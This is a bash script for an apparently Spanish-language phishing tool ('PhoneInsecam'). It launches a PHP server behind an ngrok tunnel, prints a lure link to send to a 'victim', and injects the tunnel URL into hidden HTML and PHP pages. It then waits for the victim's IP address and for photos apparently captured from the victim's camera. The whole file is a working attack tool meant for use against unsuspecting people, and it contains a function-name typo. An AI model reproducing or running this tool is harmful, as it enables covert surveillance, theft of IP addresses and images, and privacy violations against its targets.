#!/bin/bash

green="\e[0;32m\033[1m"
white="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[1;90m"

clear

banner() {
echo -e "$green
@@@@@@@   @@@  @@@   @@@@@@   @@@@@@@@  @@@  @@@  @@@  @@@  @@@
@@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@  @@@  @@@
@@!  @@@  @@!  @@@  @@!  @@@  @@!       @@!@!@@@  @@!  @@!  !@@
!@!  @!@  !@!  @!@  !@!  @!@  !@!       !@!!@!@!  !@!  !@!  @!!
@!@@!@!   @!@!@!@!  @!@  !@!  @!!!:!    @!@ !!@!  !!@   !@@!@!
!!@!!!    !!!@!!!!  !@!  !!!  !!!!!:    !@!  !!!  !!!    @!!!
!!:       !!:  !!!  !!:  !!!  !!:       !!:  !!!  !!:   !: :!!
:!:       :!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:  :!:  !:!
 ::       ::   :::  ::::: ::   :: ::::   ::   ::   ::   ::  :::
 :         :   : :   : :  :   : :: ::   ::    :    :    :    :$green
 ____  ____    _____   ___     __   ____  ___ ___  
l    j|    \  / ___/  /  _]   /  ] /    T|   T   T 
 |  T |  _  Y(   \_  /  [_   /  / Y  o  || _   _ |$red  @cr${white}eate${red}.by${green}
 |  | |  |  | \__  TY    _] /  /  |     ||  \_/  |$red wili${white}an l${red}egion${green}
 |  | |  |  | /  \ ||   [_ /   \_ |  _  ||   |   |$red   an${white}onym${red}ous${green}
 j  l |  |  | \    ||     T\     ||  |  ||   |   |
|____jl__j__j  \___jl_____j \____jl__j__jl___j___|
"

}


function catptura-ip {
ip=$(grep -a 'IP:' IP-victim | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
echo -e "\n${yellow}[${red}*${yellow}] ${green}IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat IP-victim >> IP

}

checkfound() {
echo -e "\n${yellow}[${red}*${yellow}] ${gray}Esperando datos...${white}"
while [ true ]; do
if [[ -e "IP-victim" ]]; then
echo -e "\n${yellow}[${red}*${yellow}] ${green}La víctima accedio al link!${white}\n"
captura-ip
rm -rf IP-victim
fi
sleep 0.5

if [[ -e "Log.log" ]]; then
	echo -ne "\n${yellow}[${red}*${yellow}] ${green}(1)Foto recibida!${white}"
rm -rf Log.log
fi
sleep 0.5

done

}

function payload {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' .index.html > index2.html
sed 's+forwarding_link+'$link'+g' .arch.php > index.php
}

ngrok_server() {

echo -e "${yellow}[${red}*${yellow}] ${yellow}Abriendo servidor php..."
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
echo -e "${yellow}[${red}*${yellow}] ${yellow}Abriendo servidor ngrok..."
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
echo -ne "${yellow}[${red}*${yellow}] ${yellow}Obteniendo URLs...\n"
sleep 2
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "${yellow}[${red}*${yellow}] ${green}Envíe link:\e[0m\e[1;77m %s\e[0m\n" $link

payload
checkfound
}

function comenzar {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
ngrok_server

}

banner
comenzar
